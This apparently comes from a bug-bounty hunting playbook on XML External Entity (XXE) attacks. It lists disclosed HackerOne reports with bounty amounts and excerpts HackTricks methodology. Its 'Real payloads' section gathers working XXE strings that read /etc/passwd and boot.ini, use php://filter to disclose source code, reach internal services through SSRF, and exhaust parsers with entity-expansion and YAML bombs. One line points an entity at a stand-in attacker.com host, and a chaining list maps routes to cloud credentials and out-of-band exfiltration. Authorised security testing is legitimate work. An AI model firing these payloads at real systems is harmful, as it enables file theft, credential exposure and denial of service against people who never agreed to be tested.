# Real-World Playbook — XXE (XML External Entities)

**Class:** `xxe` · **Coverage-matrix tier:** 1 · **Hunter2:** /xxe · tools/xxe_scanner.py · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed XXE reports peak at **$6,000**. Rewarded across: DuckDuckGo, GitHub Security Lab, Informatica, Mail.ru, Open-Xchange, Pornhub, Rockstar Games, Semrush.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **XXE on pulse.mail.ru** — Mail.ru, $6,000 · 264👍 · [505947](https://hackerone.com/reports/505947)
- **Multiple endpoints are vulnerable to XML External Entity injection (XXE)** — Pornhub, $2,500 · 138👍 · [72272](https://hackerone.com/reports/72272)
- **Blind XXE via Powerpoint files** — Open-Xchange, $2,000 · 86👍 · [334488](https://hackerone.com/reports/334488)
- **[Python]: CWE-611: XXE** — GitHub Security Lab, $1,800 · 4👍 · [1512937](https://hackerone.com/reports/1512937)
- **LFI and SSRF via XXE in emblem editor** — Rockstar Games, $1,500 · 79👍 · [347139](https://hackerone.com/reports/347139)
- **blind XXE when uploading avatar in mymail phone app** — Mail.ru, $1,000 · 12👍 · [277341](https://hackerone.com/reports/277341)
- **Blind XXE on my.mail.ru** — Mail.ru, $800 · 23👍 · [276276](https://hackerone.com/reports/276276)
- **Blind OOB XXE At "http://ubermovement.com/"** — Uber, $500 · 56👍 · [154096](https://hackerone.com/reports/154096)
- **Blind XXE on pu.vk.com** — VK.com, $500 · 18👍 · [296622](https://hackerone.com/reports/296622)
- **OOB XXE** — Mail.ru, $500 · 12👍 · [690387](https://hackerone.com/reports/690387)
- **OOB XXE** — Mail.ru, $500 · 5👍 · [690295](https://hackerone.com/reports/690295)
- **XXE at ecjobs.starbucks.com.cn/retail/hxpublic_v6/hxdynamicpage6.aspx** — Starbucks, $0 (disclosed) · 319👍 · [500515](https://hackerone.com/reports/500515)
- **XXE on sms-be-vip.twitter.com in SXMP Processor** — X / xAI, $0 (disclosed) · 258👍 · [248668](https://hackerone.com/reports/248668)
- **XXE on https://duckduckgo.com** — DuckDuckGo, $0 (disclosed) · 218👍 · [483774](https://hackerone.com/reports/483774)
- **Phone Call to XXE via Interactive Voice Response** — ██████, $0 (disclosed) · 172👍 · [395296](https://hackerone.com/reports/395296)
- **Partial bypass of #483774 with Blind XXE on https://duckduckgo.com** — DuckDuckGo, $0 (disclosed) · 159👍 · [486732](https://hackerone.com/reports/486732)
- **XXE through injection of a payload in the XMP metadata of a JPEG file** — Informatica, $0 (disclosed) · 138👍 · [836877](https://hackerone.com/reports/836877)
- **XXE in Site Audit function exposing file and directory contents** — Semrush, $0 (disclosed) · 115👍 · [312543](https://hackerone.com/reports/312543)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```
```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
```
<?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```
```
<!ENTITY % xxe PUBLIC "Random Text" "URL">
<!ENTITY xxe PUBLIC "Any TEXT" "URL">
```
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <address>42 rue du CTF</address>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3" >
]>
<foo>&xxe;</foo>
```
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://internal.service/secret_pass.txt" >
]>
<foo>&xxe;</foo>
```
```
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
```
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### XXE - XEE - XML External Entity


#### XML Basics

XML is a markup language designed for data storage and transport, featuring a flexible structure that allows for the use of descriptively named tags. It differs from HTML by not being limited to a set of predefined tags. XML's significance has declined with the rise of JSON, despite its initial role in AJAX technology.<sup>[[2]](#references)</sup>

- **Data Representation through Entities**: Entities in XML enable the representation of data, including special characters like `&lt;` and `&gt;`, which correspond to `<` and `>` to avoid conflict with XML's tag system.
- **Defining XML Elements**: XML allows for the definition of element types, outlining how elements should be structured and what content they may contain, ranging from any type of content to specific child elements.
- **Document Type Definition (DTD)**: DTDs are crucial in XML for defining the document's structure and the types of data it can contain. They can be internal, external, or a combination, guiding how documents are formatted and validated.
- **Custom and External Entities**: XML supports the creation of custom entities within a DTD for flexible data representation. External entities, defined with a URL, raise security concerns, particularly in the context of XML External Entity (XXE) attacks, which exploit the way XML parsers handle external data sources: `<!DOCTYPE foo [ <!ENTITY myentity "value" > ]>`
- **XXE Detection with Parameter Entities**: For detecting XXE vulnerabilities, especially when conventional methods fail due to parser security measures, XML parameter entities can be utilized. These entities allow for out-of-band detection techniques, such as triggering DNS lookups or HTTP requests to a controlled domain, to confirm the vulnerability.
  - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
  - `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

#### Main attacks

[**Most of these attacks were tested using the awesome Portswiggers XEE labs: https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)<sup>[[8]](#references)</sup>

##### New Entity test

In this attack I'm going to test if a simple new ENTITY declaration is working

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- XXE → file read (/etc/passwd, config) → secrets
- XXE → **SSRF** → cloud metadata → creds
- Blind XXE → OOB exfil via external DTD
- Hidden XXE in SVG/DOCX/XLSX upload, SOAP, SAML

## Hunter2 wiring
- **Run:** `/xxe · tools/xxe_scanner.py`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
